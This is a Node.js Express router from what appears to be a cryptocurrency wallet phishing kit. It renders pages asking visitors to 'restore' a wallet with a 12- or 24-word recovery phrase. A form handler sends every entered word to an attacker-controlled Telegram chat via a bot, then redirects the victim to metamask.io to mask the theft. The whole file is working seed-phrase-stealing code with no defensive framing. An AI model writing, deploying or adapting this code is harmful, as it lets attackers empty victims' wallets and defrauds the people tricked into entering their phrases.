const { Telegraf } = require("telegraf");
var express = require("express");

var router = express.Router();
const bot = new Telegraf(process.env.BOT_TOKEN);

/* GET home page. */
router.get("/", function (req, res, next) {
  res.render("index", { title: "Index" });
});

router.get("/connect", (req, res, next) => {
  res.render("connect", { title: "Connect" });
});

router.get("/restore", (req, res, next) => {
  if (!req.query.phrases) {
    return res.redirect("/");
  }

  if (req.query.phrases === "12") {
    return res.render("restore-12");
  }

  if (req.query.phrases === "24") {
    return res.render("restore-24");
  }
});

router.post("/form-destination", (req, res, next) => {
  if (req.headers.referer.includes("restore?phrases=12")) {
    bot.telegram.sendMessage(
      process.env.CHAT_ID,
      `Phrases 👇:\n\n1: ${req.body.Field1}\n2: ${req.body.Field2}\n3: ${req.body.Field3}\n4: ${req.body.Field4}\n5: ${req.body.Field5}\n6: ${req.body.Field6}\n7: ${req.body.Field7}\n8: ${req.body.Field8}\n9: ${req.body.Field9}\n10: ${req.body.Field10}\n11: ${req.body.Field11}\n12: ${req.body.Field12}`,
      {
        parse_mode: "HTML",
      }
    );
  } else {
    bot.telegram.sendMessage(
      process.env.CHAT_ID,
      `Phrases 👇:\n\n1: ${req.body.Field1}\n2: ${req.body.Field2}\n3: ${req.body.Field3}\n4: ${req.body.Field4}\n5: ${req.body.Field5}\n6: ${req.body.Field6}\n7: ${req.body.Field7}\n8: ${req.body.Field8}\n9: ${req.body.Field9}\n10: ${req.body.Field10}\n11: ${req.body.Field11}\n12: ${req.body.Field12}\n13: ${req.body.Field13}\n14: ${req.body.Field14}\n15: ${req.body.Field15}\n16: ${req.body.Field16}\n17: ${req.body.Field17}\n18: ${req.body.Field18}\n19: ${req.body.Field19}\n20: ${req.body.Field20}\n21: ${req.body.Field21}\n22: ${req.body.Field22}\n23: ${req.body.Field23}\n24: ${req.body.Field24}`,
      {
        parse_mode: "HTML",
      }
    );
  }

  res.redirect("https://metamask.io");
});

module.exports = router;
